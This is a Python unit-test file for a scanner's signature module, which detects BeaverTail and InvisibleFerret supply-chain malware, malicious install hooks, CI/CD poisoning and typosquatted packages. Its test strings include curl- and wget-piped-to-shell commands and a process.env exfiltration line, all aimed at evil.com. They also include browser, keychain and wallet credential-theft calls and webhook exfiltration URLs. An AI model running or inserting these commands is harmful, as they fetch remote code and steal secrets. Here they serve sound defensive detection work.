"""Unit tests for the contagious_scan.signatures module.

Verifies that all pattern data structures are well-formed, regex patterns
compile and match their intended targets, and helper functions return
correct results.
"""

from __future__ import annotations

import re
from typing import Any

import pytest

from contagious_scan.signatures import (
    DANGEROUS_API_SEQUENCES,
    LIFECYCLE_HOOK_PATTERNS,
    MALICIOUS_HASHES,
    REGEX_PATTERNS,
    SEVERITY_ORDER,
    SUSPICIOUS_PACKAGE_NAMES,
    CI_CD_PATTERNS,
    APISequencePattern,
    HashRecord,
    PackageNamePattern,
    SignaturePattern,
    all_pattern_ids,
    get_api_sequences_for_extension,
    get_patterns_for_extension,
    severity_rank,
)


# ---------------------------------------------------------------------------
# Structural integrity
# ---------------------------------------------------------------------------


class TestSignaturePatternStructure:
    """Tests that all SignaturePattern entries are structurally valid."""

    def test_all_patterns_have_non_empty_id(self) -> None:
        for p in REGEX_PATTERNS:
            assert p.pattern_id, f"Empty pattern_id found in {p}"

    def test_all_patterns_have_valid_severity(self) -> None:
        valid = {"critical", "high", "medium", "info"}
        for p in REGEX_PATTERNS:
            assert p.severity in valid, (
                f"{p.pattern_id} has invalid severity '{p.severity}'"
            )

    def test_all_patterns_have_compiled_regex(self) -> None:
        for p in REGEX_PATTERNS:
            assert isinstance(p.regex, re.Pattern), (
                f"{p.pattern_id}.regex is not a compiled Pattern"
            )

    def test_all_patterns_have_description(self) -> None:
        for p in REGEX_PATTERNS:
            assert p.description.strip(), (
                f"{p.pattern_id} has empty description"
            )

    def test_all_patterns_have_remediation(self) -> None:
        for p in REGEX_PATTERNS:
            assert p.remediation.strip(), (
                f"{p.pattern_id} has empty remediation"
            )

    def test_pattern_ids_are_unique(self) -> None:
        ids = [p.pattern_id for p in REGEX_PATTERNS]
        duplicates = [pid for pid in set(ids) if ids.count(pid) > 1]
        assert not duplicates, f"Duplicate pattern IDs found: {duplicates}"

    def test_file_extensions_are_frozensets(self) -> None:
        for p in REGEX_PATTERNS:
            assert isinstance(p.file_extensions, frozenset), (
                f"{p.pattern_id}.file_extensions is not a frozenset"
            )

    def test_tags_are_frozensets(self) -> None:
        for p in REGEX_PATTERNS:
            assert isinstance(p.tags, frozenset), (
                f"{p.pattern_id}.tags is not a frozenset"
            )


class TestHashRecordStructure:
    """Tests that all HashRecord entries are structurally valid."""

    def test_all_hashes_are_64_char_hex(self) -> None:
        hex_re = re.compile(r"^[0-9a-f]{64}$")
        for sha, record in MALICIOUS_HASHES.items():
            assert hex_re.match(sha), f"Dict key '{sha}' is not a valid SHA-256 hex"
            assert hex_re.match(record.sha256), (
                f"HashRecord.sha256 '{record.sha256}' is not valid"
            )

    def test_dict_key_matches_record_sha256(self) -> None:
        for sha, record in MALICIOUS_HASHES.items():
            assert sha == record.sha256, (
                f"Dict key '{sha}' does not match record.sha256 '{record.sha256}'"
            )

    def test_all_hash_records_have_description(self) -> None:
        for sha, record in MALICIOUS_HASHES.items():
            assert record.description.strip(), (
                f"HashRecord for {sha} has empty description"
            )

    def test_all_hash_records_have_valid_severity(self) -> None:
        valid = {"critical", "high", "medium", "info"}
        for sha, record in MALICIOUS_HASHES.items():
            assert record.severity in valid, (
                f"HashRecord for {sha} has invalid severity '{record.severity}'"
            )


class TestPackageNamePatternStructure:
    """Tests that all PackageNamePattern entries are structurally valid."""

    def test_all_package_patterns_have_non_empty_id(self) -> None:
        for p in SUSPICIOUS_PACKAGE_NAMES:
            assert p.pattern_id.strip()

    def test_all_package_patterns_have_valid_ecosystem(self) -> None:
        valid = {"npm", "pypi", "any"}
        for p in SUSPICIOUS_PACKAGE_NAMES:
            assert p.ecosystem in valid, (
                f"{p.pattern_id} has invalid ecosystem '{p.ecosystem}'"
            )

    def test_all_package_patterns_have_compiled_regex(self) -> None:
        for p in SUSPICIOUS_PACKAGE_NAMES:
            assert isinstance(p.regex, re.Pattern)


class TestAPISequencePatternStructure:
    """Tests that all APISequencePattern entries are structurally valid."""

    def test_all_api_patterns_have_non_empty_id(self) -> None:
        for p in DANGEROUS_API_SEQUENCES:
            assert p.pattern_id.strip()

    def test_all_api_patterns_have_valid_severity(self) -> None:
        valid = {"critical", "high", "medium", "info"}
        for p in DANGEROUS_API_SEQUENCES:
            assert p.severity in valid

    def test_all_api_patterns_have_compiled_regex(self) -> None:
        for p in DANGEROUS_API_SEQUENCES:
            assert isinstance(p.regex, re.Pattern)


# ---------------------------------------------------------------------------
# BeaverTail JS pattern matching
# ---------------------------------------------------------------------------


class TestBeaverTailJSPatterns:
    """Verify BeaverTail JavaScript patterns match expected malicious strings."""

    def _get(self, pid: str) -> SignaturePattern:
        for p in REGEX_PATTERNS:
            if p.pattern_id == pid:
                return p
        pytest.fail(f"Pattern {pid} not found")

    def test_eval_atob_matches(self) -> None:
        p = self._get("BT_JS_EVAL_ATOB")
        assert p.regex.search("eval(atob('SGVsbG8='))")
        assert p.regex.search("eval( atob ( 'test' ) )")

    def test_eval_atob_no_false_positive(self) -> None:
        p = self._get("BT_JS_EVAL_ATOB")
        assert not p.regex.search("console.log('hello world')")
        assert not p.regex.search("const x = atob('abc');")

    def test_buffer_exec_matches(self) -> None:
        p = self._get("BT_JS_BUFFER_EXEC")
        code = "const payload = Buffer.from('SGVsbG8=', 'base64'); exec(payload)"
        assert p.regex.search(code)

    def test_process_env_exfil_matches(self) -> None:
        p = self._get("BT_JS_PROCESS_ENV_EXFIL")
        code = "const data = process.env; https.request({host:'evil.com'}, cb)"
        assert p.regex.search(code)

    def test_crypto_wallet_matches(self) -> None:
        p = self._get("BT_JS_CRYPTO_WALLET_STEAL")
        assert p.regex.search("readFile('/Users/test/Library/Application Support/MetaMask')")
        assert p.regex.search("path.join(home, 'wallet.dat')")

    def test_keytar_matches(self) -> None:
        p = self._get("BT_JS_KEYTAR_ABUSE")
        assert p.regex.search("const keytar = require('keytar')")
        assert not p.regex.search("require('lodash')")

    def test_hex_string_matches(self) -> None:
        p = self._get("BT_JS_OBFUSCATED_HEX_STRING")
        long_hex = "'" + "ab" * 70 + "'"
        assert p.regex.search(long_hex)

    def test_hex_string_no_false_positive_short(self) -> None:
        p = self._get("BT_JS_OBFUSCATED_HEX_STRING")
        short_hex = "'" + "ab" * 10 + "'"  # only 20 chars, below threshold
        assert not p.regex.search(short_hex)

    def test_function_constructor_atob_matches(self) -> None:
        p = self._get("BT_JS_FUNCTION_CONSTRUCTOR_ATOB")
        assert p.regex.search("new Function(atob('code'))")

    def test_chained_fromcharcode_matches(self) -> None:
        p = self._get("BT_JS_CHAINED_REPLACE_FROMCHARCODE")
        code = (
            "String.fromCharCode(72) + String.fromCharCode(101) + "
            "String.fromCharCode(108) + String.fromCharCode(108)"
        )
        assert p.regex.search(code)


# ---------------------------------------------------------------------------
# InvisibleFerret Python pattern matching
# ---------------------------------------------------------------------------


class TestInvisibleFerretPythonPatterns:
    """Verify InvisibleFerret Python patterns match expected malicious strings."""

    def _get(self, pid: str) -> SignaturePattern:
        for p in REGEX_PATTERNS:
            if p.pattern_id == pid:
                return p
        pytest.fail(f"Pattern {pid} not found")

    def test_exec_b64decode_matches(self) -> None:
        p = self._get("IF_PY_EXEC_B64DECODE")
        assert p.regex.search("exec(base64.b64decode('aGVsbG8='))")

    def test_exec_b64decode_no_false_positive(self) -> None:
        p = self._get("IF_PY_EXEC_B64DECODE")
        assert not p.regex.search("data = base64.b64decode('aGVsbG8=')")
        assert not p.regex.search("print('hello')")

    def test_zlib_exec_matches(self) -> None:
        p = self._get("IF_PY_ZLIB_DECOMPRESS_EXEC")
        code = "exec(zlib.decompress(base64.b64decode(payload)))"
        assert p.regex.search(code)

    def test_os_system_curl_pipe_matches(self) -> None:
        p = self._get("IF_PY_OS_SYSTEM_CURL_PIPE")
        code = "os.system('curl https://evil.com/sh | bash')"
        assert p.regex.search(code)

    def test_browser_db_steal_matches(self) -> None:
        p = self._get("IF_PY_BROWSER_DB_STEAL")
        assert p.regex.search("open(os.path.join(profile, 'Login Data'), 'rb')")
        assert p.regex.search("shutil.copy(os.path.join(ff_profile, 'key4.db'), tmp)")

    def test_keychain_access_matches(self) -> None:
        p = self._get("IF_PY_KEYCHAIN_ACCESS")
        assert p.regex.search("subprocess.run(['security', 'find-generic-password', '-s', 'Chrome'])")

    def test_marshal_loads_exec_matches(self) -> None:
        p = self._get("IF_PY_MARSHAL_LOADS_EXEC")
        code = "code = marshal.loads(data); exec(code)"
        assert p.regex.search(code)


# ---------------------------------------------------------------------------
# Obfuscation pattern matching
# ---------------------------------------------------------------------------


class TestObfuscationPatterns:
    """Verify generic obfuscation patterns."""

    def _get(self, pid: str) -> SignaturePattern:
        for p in REGEX_PATTERNS:
            if p.pattern_id == pid:
                return p
        pytest.fail(f"Pattern {pid} not found")

    def test_curl_pipe_bash_matches(self) -> None:
        p = self._get("OBF_CURL_PIPE_BASH")
        assert p.regex.search("curl https://evil.com/install.sh | bash")
        assert p.regex.search("wget -q -O- http://evil.com/x.sh | sh")

    def test_curl_pipe_bash_no_false_positive(self) -> None:
        p = self._get("OBF_CURL_PIPE_BASH")
        assert not p.regex.search("curl https://api.example.com/data | jq .")

    def test_long_base64_literal_matches(self) -> None:
        p = self._get("OBF_BASE64_LONG_LITERAL")
        long_b64 = "'" + "A" * 260 + "=="  + "'"
        assert p.regex.search(long_b64)

    def test_long_base64_no_false_positive_short(self) -> None:
        p = self._get("OBF_BASE64_LONG_LITERAL")
        short = "'" + "AAAA" * 10 + "'"  # 40 chars, below 256 threshold
        assert not p.regex.search(short)

    def test_unicode_escape_matches(self) -> None:
        p = self._get("OBF_UNICODE_ESCAPE_SEQUENCE")
        dense = "\\u0068\\u0065\\u006c\\u006c\\u006f\\u0077\\u006f\\u0072\\u006c\\u0064"
        assert p.regex.search(dense)


# ---------------------------------------------------------------------------
# Lifecycle hook pattern matching
# ---------------------------------------------------------------------------


class TestLifecycleHookPatterns:
    """Verify lifecycle hook abuse patterns."""

    def _get(self, pid: str) -> SignaturePattern:
        for p in LIFECYCLE_HOOK_PATTERNS:
            if p.pattern_id == pid:
                return p
        pytest.fail(f"Lifecycle pattern {pid} not found")

    def test_npm_postinstall_curl_matches(self) -> None:
        p = self._get("LH_NPM_POSTINSTALL_CURL")
        json_snippet = '"postinstall": "curl https://evil.com/install.sh | bash"'
        assert p.regex.search(json_snippet)

    def test_npm_postinstall_curl_no_false_positive(self) -> None:
        p = self._get("LH_NPM_POSTINSTALL_CURL")
        benign = '"test": "jest --coverage"'
        assert not p.regex.search(benign)

    def test_npm_postinstall_node_exec_matches(self) -> None:
        p = self._get("LH_NPM_POSTINSTALL_NODE_EXEC")
        snippet = '"postinstall": "node -e require(\'./setup\')"'
        assert p.regex.search(snippet)

    def test_setup_py_os_system_matches(self) -> None:
        p = self._get("LH_SETUP_PY_OS_SYSTEM")
        code = "os.system('curl https://evil.com | bash')"
        assert p.regex.search(code)

    def test_setup_py_subprocess_matches(self) -> None:
        p = self._get("LH_SETUP_PY_SUBPROCESS")
        code = "subprocess.run(['bash', 'install.sh'], check=True)"
        assert p.regex.search(code)

    def test_setup_py_urllib_matches(self) -> None:
        p = self._get("LH_SETUP_PY_URLLIB_FETCH")
        code = "urllib.request.urlopen('https://evil.com/payload').read()"
        assert p.regex.search(code)


# ---------------------------------------------------------------------------
# CI/CD pattern matching
# ---------------------------------------------------------------------------


class TestCICDPatterns:
    """Verify CI/CD poisoning patterns."""

    def _get(self, pid: str) -> SignaturePattern:
        for p in CI_CD_PATTERNS:
            if p.pattern_id == pid:
                return p
        pytest.fail(f"CI/CD pattern {pid} not found")

    def test_github_actions_curl_pipe_matches(self) -> None:
        p = self._get("CICD_GH_ACTIONS_CURL_PIPE")
        yaml_snippet = "run: |\n  curl https://evil.com/install.sh | bash\n"
        assert p.regex.search(yaml_snippet)

    def test_github_actions_base64_eval_matches(self) -> None:
        p = self._get("CICD_GH_ACTIONS_BASE64_EVAL")
        yaml_snippet = (
            "run: |\n"
            "  echo " + "A" * 50 + "== | base64 -d | bash\n"
        )
        assert p.regex.search(yaml_snippet)


# ---------------------------------------------------------------------------
# Network pattern matching
# ---------------------------------------------------------------------------


class TestNetworkPatterns:
    """Verify network-based IOC patterns."""

    def _get(self, pid: str) -> SignaturePattern:
        for p in REGEX_PATTERNS:
            if p.pattern_id == pid:
                return p
        pytest.fail(f"Pattern {pid} not found")

    def test_suspicious_tld_matches(self) -> None:
        p = self._get("NET_SUSPICIOUS_TLD")
        assert p.regex.search("https://malware-c2.xyz/payload")
        assert p.regex.search("http://evil.top/gate")
        assert p.regex.search("https://dropper.pw/install")

    def test_suspicious_tld_no_false_positive(self) -> None:
        p = self._get("NET_SUSPICIOUS_TLD")
        assert not p.regex.search("https://example.com/api")
        assert not p.regex.search("https://github.com/org/repo")

    def test_raw_ip_matches(self) -> None:
        p = self._get("NET_RAW_IP_CONNECTION")
        assert p.regex.search("https://192.168.1.100/payload")
        assert p.regex.search("http://10.0.0.1/gate")

    def test_discord_webhook_matches(self) -> None:
        p = self._get("NET_DISCORD_WEBHOOK_EXFIL")
        assert p.regex.search(
            "https://discord.com/api/webhooks/123456789/ABCDEFabcdef_-xyz"
        )
        assert p.regex.search(
            "https://discordapp.com/api/webhooks/987654321/tokenhere"
        )

    def test_telegram_exfil_matches(self) -> None:
        p = self._get("NET_TELEGRAM_EXFIL")
        assert p.regex.search(
            "https://api.telegram.org/bot123:TOKEN/sendMessage"
        )


# ---------------------------------------------------------------------------
# Package name pattern matching
# ---------------------------------------------------------------------------


class TestSuspiciousPackageNames:
    """Verify suspicious package name patterns."""

    def _get(self, pid: str) -> PackageNamePattern:
        for p in SUSPICIOUS_PACKAGE_NAMES:
            if p.pattern_id == pid:
                return p
        pytest.fail(f"Package pattern {pid} not found")

    def test_npm_known_malicious_matches(self) -> None:
        p = self._get("PKG_NPM_KNOWN_MALICIOUS")
        assert p.regex.match("dev-utils-pro")
        assert p.regex.match("node-utils-extra")
        assert p.regex.match("icons-packages")

    def test_npm_known_malicious_no_false_positive(self) -> None:
        p = self._get("PKG_NPM_KNOWN_MALICIOUS")
        assert not p.regex.match("react")
        assert not p.regex.match("lodash")
        assert not p.regex.match("express")

    def test_pypi_known_malicious_matches(self) -> None:
        p = self._get("PKG_PYPI_KNOWN_MALICIOUS")
        assert p.regex.match("pycryptoenv")
        assert p.regex.match("pycryptoconf")

    def test_npm_typosquat_react_matches(self) -> None:
        p = self._get("PKG_NPM_TYPOSQUAT_REACT")
        assert p.regex.match("reaact")
        assert p.regex.match("raect")

    def test_npm_typosquat_react_no_false_positive(self) -> None:
        p = self._get("PKG_NPM_TYPOSQUAT_REACT")
        assert not p.regex.match("react")
        assert not p.regex.match("react-dom")


# ---------------------------------------------------------------------------
# Helper function tests
# ---------------------------------------------------------------------------


class TestHelperFunctions:
    """Tests for module-level helper functions."""

    def test_severity_rank_ordering(self) -> None:
        assert severity_rank("critical") > severity_rank("high")
        assert severity_rank("high") > severity_rank("medium")
        assert severity_rank("medium") > severity_rank("info")
        assert severity_rank("info") > 0

    def test_severity_rank_unknown_returns_zero(self) -> None:
        assert severity_rank("unknown") == 0
        assert severity_rank("") == 0

    def test_severity_rank_case_insensitive(self) -> None:
        assert severity_rank("CRITICAL") == severity_rank("critical")
        assert severity_rank("High") == severity_rank("high")

    def test_get_patterns_for_extension_js(self) -> None:
        patterns = get_patterns_for_extension(".js")
        ids = {p.pattern_id for p in patterns}
        # JS-specific patterns must be present
        assert "BT_JS_EVAL_ATOB" in ids
        assert "BT_JS_KEYTAR_ABUSE" in ids
        # Python-only patterns must not be present
        python_only = {p.pattern_id for p in REGEX_PATTERNS if p.file_extensions == frozenset({".py"})}
        for pid in python_only:
            assert pid not in ids, f"Python-only pattern {pid} incorrectly returned for .js"

    def test_get_patterns_for_extension_py(self) -> None:
        patterns = get_patterns_for_extension(".py")
        ids = {p.pattern_id for p in patterns}
        assert "IF_PY_EXEC_B64DECODE" in ids
        assert "LH_SETUP_PY_OS_SYSTEM" in ids

    def test_get_patterns_for_extension_universal(self) -> None:
        """Patterns with empty file_extensions should appear for any extension."""
        universal = [p for p in REGEX_PATTERNS if not p.file_extensions]
        patterns_for_rb = get_patterns_for_extension(".rb")
        ids_for_rb = {p.pattern_id for p in patterns_for_rb}
        for p in universal:
            assert p.pattern_id in ids_for_rb, (
                f"Universal pattern {p.pattern_id} not returned for .rb"
            )

    def test_get_patterns_for_extension_case_insensitive(self) -> None:
        lower = get_patterns_for_extension(".js")
        upper = get_patterns_for_extension(".JS")
        assert {p.pattern_id for p in lower} == {p.pattern_id for p in upper}

    def test_get_api_sequences_for_extension_js(self) -> None:
        seqs = get_api_sequences_for_extension(".js")
        ids = {s.pattern_id for s in seqs}
        assert "API_JS_EVAL_ATOB_CHAIN" in ids
        assert "API_JS_PROCESS_ENV_SEND" in ids

    def test_get_api_sequences_for_extension_py(self) -> None:
        seqs = get_api_sequences_for_extension(".py")
        ids = {s.pattern_id for s in seqs}
        assert "API_PY_EXEC_DECODE_CHAIN" in ids

    def test_all_pattern_ids_returns_sorted_unique_list(self) -> None:
        ids = all_pattern_ids()
        assert ids == sorted(set(ids)), "all_pattern_ids() must return a sorted, unique list"
        assert len(ids) > 0

    def test_all_pattern_ids_includes_regex_pattern_ids(self) -> None:
        ids = set(all_pattern_ids())
        for p in REGEX_PATTERNS:
            assert p.pattern_id in ids

    def test_all_pattern_ids_includes_package_pattern_ids(self) -> None:
        ids = set(all_pattern_ids())
        for p in SUSPICIOUS_PACKAGE_NAMES:
            assert p.pattern_id in ids

    def test_all_pattern_ids_includes_api_sequence_ids(self) -> None:
        ids = set(all_pattern_ids())
        for p in DANGEROUS_API_SEQUENCES:
            assert p.pattern_id in ids


# ---------------------------------------------------------------------------
# Minimum coverage assertions
# ---------------------------------------------------------------------------


class TestMinimumCoverage:
    """Assert minimum numbers of signatures are present."""

    def test_minimum_regex_patterns(self) -> None:
        assert len(REGEX_PATTERNS) >= 20, (
            f"Expected at least 20 regex patterns, got {len(REGEX_PATTERNS)}"
        )

    def test_minimum_hash_records(self) -> None:
        assert len(MALICIOUS_HASHES) >= 5, (
            f"Expected at least 5 hash records, got {len(MALICIOUS_HASHES)}"
        )

    def test_minimum_package_name_patterns(self) -> None:
        assert len(SUSPICIOUS_PACKAGE_NAMES) >= 5, (
            f"Expected at least 5 package name patterns, got {len(SUSPICIOUS_PACKAGE_NAMES)}"
        )

    def test_minimum_api_sequences(self) -> None:
        assert len(DANGEROUS_API_SEQUENCES) >= 5, (
            f"Expected at least 5 API sequences, got {len(DANGEROUS_API_SEQUENCES)}"
        )

    def test_beavertail_patterns_present(self) -> None:
        bt_patterns = [
            p for p in REGEX_PATTERNS if "beavertail" in p.tags
        ]
        assert len(bt_patterns) >= 5, (
            f"Expected at least 5 BeaverTail patterns, got {len(bt_patterns)}"
        )

    def test_invisibleferret_patterns_present(self) -> None:
        if_patterns = [
            p for p in REGEX_PATTERNS if "invisibleferret" in p.tags
        ]
        assert len(if_patterns) >= 5, (
            f"Expected at least 5 InvisibleFerret patterns, got {len(if_patterns)}"
        )

    def test_lifecycle_hook_patterns_present(self) -> None:
        assert len(LIFECYCLE_HOOK_PATTERNS) >= 5

    def test_cicd_patterns_present(self) -> None:
        assert len(CI_CD_PATTERNS) >= 3
